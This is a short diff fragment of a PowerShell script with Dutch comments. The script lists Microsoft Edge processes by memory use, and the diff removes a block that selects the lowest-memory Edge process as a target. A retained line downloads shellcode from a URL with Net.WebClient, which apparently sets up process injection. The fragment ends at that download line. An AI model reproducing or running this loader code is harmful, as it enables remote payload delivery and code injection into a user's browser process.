@@ -35,17 +35,6 @@ $edgeProcesses | Sort-Object WorkingSet64 -Descending | ForEach-Object {
 
 Write-Host "-------------------------------------------------------------`n" -ForegroundColor DarkGray
 
-# ==================== LAAGSTE MEMORY SELECTEREN ====================
-$targetProcess = $edgeProcesses | 
-                 Sort-Object WorkingSet64 -Ascending | 
-                 Select-Object -First 1
-
-$targetPID = $targetProcess.Id
-$memoryMB = [math]::Round($targetProcess.WorkingSet64 / 1MB, 1)
-
-Write-Host "[+] Laagste memory proces gekozen!" -ForegroundColor Green
-Write-Host "[+] PID: $targetPID  |  Geheugen: $memoryMB MB" -ForegroundColor Green
-Write-Host ""
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
